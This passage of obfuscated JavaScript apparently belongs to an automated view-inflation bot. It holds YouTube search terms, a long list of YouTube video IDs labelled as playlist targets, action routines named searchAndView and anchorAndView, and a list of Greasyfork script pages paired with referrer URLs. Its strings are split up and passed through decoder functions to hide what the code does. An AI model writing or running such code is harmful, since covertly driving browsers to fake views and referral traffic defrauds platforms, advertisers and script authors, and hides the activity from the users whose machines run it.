',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x8a8 + -0x6ce + 0x3 * -0x9d);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    V(0x9) + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    W(0x3, 'bd#i') + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + W(0x10, 'uvBk') + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + W(0x1, 'di6)')
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + V(0x11) + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + X(0x2) + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': V(0xe) + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
